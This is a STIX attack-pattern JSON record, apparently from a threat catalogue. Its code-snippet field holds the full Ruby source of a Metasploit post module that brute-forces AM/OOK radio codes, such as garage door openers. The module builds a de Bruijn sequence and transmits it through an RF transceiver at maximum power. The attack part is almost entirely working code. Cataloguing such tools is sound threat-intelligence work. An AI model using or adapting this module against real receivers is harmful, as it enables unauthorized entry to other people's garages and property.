{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--24e01719-5ec4-489d-81a6-89614759108d",
    "created": "2024-08-14T16:33:00.211029Z",
    "modified": "2024-08-14T16:33:00.211033Z",
    "name": "Brute Force AM/OOK (ie: Garage Doors)",
    "description": " Post Module for HWBridge RFTranscievers.  Brute forces AM OOK or raw binary signals.  This is a port of the rfpwnon tool by Corey Harding. (https://github.com/exploitagency/github-rfpwnon/blob/master/rfpwnon.py)  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/hardware/rftransceiver/rfpwnon.rb",
            "external_id": "rfpwnon.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Hardware::RFTransceiver::RFTransceiver\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Brute Force AM/OOK (ie: Garage Doors)',\n        'Description' => %q{\n          Post Module for HWBridge RFTranscievers.  Brute forces AM OOK or raw\n          binary signals.  This is a port of the rfpwnon tool by Corey Harding.\n          (https://github.com/exploitagency/github-rfpwnon/blob/master/rfpwnon.py)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Craig Smith'],\n        'Platform' => ['hardware'],\n        'SessionTypes' => ['hwbridge']\n      )\n    )\n    register_options([\n      OptInt.new('FREQ', [true, 'Frequency to transmit on']),\n      OptInt.new('BAUD', [false, 'Baud rate to use', 2000]),\n      OptInt.new('BINLENGTH', [false, 'Binary Length of signal to brute force', 8]),\n      OptInt.new('REPEAT', [false, 'Number of times to repeat the signal', 5]),\n      OptString.new('PPAD', [false, 'Specify your own binary padding before the brute forced binary', nil]),\n      OptString.new('TPAD', [false, 'Specify your own binary padding after the brute forced binary', nil]),\n      OptBool.new('RAW', [false, 'When set, disables PWM encoding. BINLENGTH must be -1', false]),\n      OptBool.new('TRI', [false, 'When set, brute foces a trinary signal.', false]),\n      OptBool.new('EXTRAVERBOSE', [false, 'More verbose', false]),\n      OptInt.new('INDEX', [false, 'USB Index to use', 0]),\n      OptInt.new('DELAY', [false, 'Delay in milliseconds between transmissions', 500])\n    ])\n    @zeropwm = '1110'\n    @onepwm = '1000'\n    @brutechar = '01'\n  end\n\n  # @param key [String] binary/trinary represntation\n  # @return [Array] ByteArray\n  def convert_ook(key)\n    pwm_str_key = ''\n    key.each_char do |k|\n      x = '*'\n      case k\n      when '0'\n        x = @zeropwm\n      when '1'\n        x = @onepwm\n      when '2'\n        x = @twopwm\n      end\n      pwm_str_key += x\n    end\n    return pwm_str_key.scan(/.{1,8}/).collect { |x| x.to_i(2).chr }\n  end\n\n  def debruijn_bytes(k, n)\n    @a = [0]\n    @sequence = []\n    debruijn(1, 1, k, n)\n    return @sequence.join\n  end\n\n  def debruijn(t, p, k, n)\n    if t > n\n      if n % p == 0\n        1.upto(p) { |j| @sequence << @a[j] }\n      end\n    else\n      @a[t] = @a[t - p]\n      debruijn(t + 1, p, k, n)\n      (@a[t - p] + 1).upto(k - 1) do |j|\n        @a[t] = j\n        debruijn(t + 1, t, k, n)\n      end\n    end\n  end\n\n  def run\n    unless is_rf?\n      print_error('Not an RF Transceiver')\n      return\n    end\n    unless set_index(datastore['INDEX'])\n      print_error(\"Couldn't set usb index to #{datastore['INDEX']}\")\n      return\n    end\n    if datastore['TRI']\n      @zeropwm = '10001000'\n      @onepwm = '11101110'\n      @twopwm = '10001110'\n      @brutechar = '012'\n    end\n\n    set_modulation('ASK/OOK')\n    set_freq(datastore['FREQ'])\n    set_sync_mode(0)\n    set_baud(datastore['BAUD'])\n    max_power\n\n    print_status('Generating de bruijn sequence...')\n    seq = debruijn_bytes(@brutechar.length, datastore['BINLENGTH'])\n    tail = seq[0, datastore['BINLENGTH'] - 1]\n    brutepacket = seq + tail\n\n    print_status(\"Brute forcing frequency: #{datastore['FREQ']}\")\n    print_status(\"Padding before binary: #{datastore['PPAD']}\") if datastore['PPAD']\n    print_status(\"Padding after binary: #{datastore['TPAD']}\") if datastore['TPAD']\n    print_status(\"De Bruijin Sequence: #{brutepacket}\") if datastore['EXTRAVERBOSE']\n\n    startn = 0\n    endy = 512\n    brutepackettmp = ''\n    addr = 512\n    if datastore['TRI']\n      endy = 128\n      addr = 128\n    end\n    if datastore['REPEAT'] >= 2 || datastore['PPAD'] || datastore['TPAD']\n      endy = datastore['BINLENGTH']\n      addr = 1\n    end\n    # Transmit\n    while startn < brutepacket.length\n      (0..datastore['REPEAT'] - 1).each do |_i|\n        brutepackettemp = brutepacket[startn..endy - 1]\n        next if brutepackettemp.length < datastore['BINLENGTH']\n\n        # Pad if asked to\n        brutepackettemp = datastore['PPAD'] + brutepackettemp if datastore['PPAD']\n        brutepackettemp += datastore['TPAD'] if datastore['TPAD']\n        if datastore['RAW']\n          key_packed = brutepackettemp.scan(/.{1,8}/).collect { |x| x.to_i(2).chr }\n        else\n          key_packed = convert_ook(brutepackettemp)\n        end\n        print_status('Transmitting...')\n        set_flen(key_packed.length)\n        rfxmit(key_packed.join)\n        print_status('Binary before PWM encoding:')\n        print_status(brutepackettemp.to_s)\n        print_status('Binary after PWM encoding:')\n        print_status(key_packed.join.unpack('H*')[0].hex.to_s(2).to_s)\n        sleep(datastore['DELAY'] / 1000) if datastore['DELAY'] > 0\n      end\n      if (datastore['REPEAT'] >= 2) || datastore['PPAD'] || datastore['TPAD']\n        startn += addr\n        endy += addr\n      else\n        startn = startn + addr - datastore['BINLENGTH']\n        endy = endy + addr - datastore['BINLENGTH']\n      end\n    end\n    print_status('Done')\n    set_mode('IDLE')\n  end\nend\n",
    "x_mitre_platforms": [
        "['hardware']"
    ]
}